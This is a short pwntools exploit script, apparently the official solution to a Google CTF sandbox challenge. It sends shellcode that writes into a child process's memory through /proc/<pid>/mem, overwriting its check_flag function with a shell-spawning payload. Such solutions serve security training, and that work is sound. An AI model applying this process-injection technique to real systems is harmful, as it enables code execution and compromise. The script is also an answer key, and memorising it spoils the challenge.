#!/usr/bin/env python3
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
#     Unless required by applicable law or agreed to in writing, software
#     distributed under the License is distributed on an "AS IS" BASIS,
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#     See the License for the specific language governing permissions and
#     limitations under the License.

import pwnlib
import os

pwnlib.context.context.binary = 'chal'

r = pwnlib.context.context.binary.process()

r.recvuntil('[DEBUG] child pid: ')
child_pid = int(r.recvline())

sc2 = pwnlib.asm.asm(pwnlib.shellcraft.nop()*0x100 + pwnlib.shellcraft.sh())

sc = ''
sc += pwnlib.shellcraft.open("/proc/{}/mem".format(child_pid), os.O_WRONLY)
sc += pwnlib.shellcraft.mov('r12', 'rax') 
sc += pwnlib.shellcraft.syscall('SYS_lseek', 'r12', pwnlib.context.context.binary.symbols['check_flag'], os.SEEK_SET)
sc += pwnlib.shellcraft.pushstr(sc2)
sc += pwnlib.shellcraft.write("r12", "rsp", len(sc2))

sc = pwnlib.asm.asm(sc) + b'\xeb\xfe'

r.sendlineafter('shellcode length? ', str(len(sc)))
r.sendafter('bytes of shellcode. ', sc)

r.sendline('echo "hello"')

r.interactive()
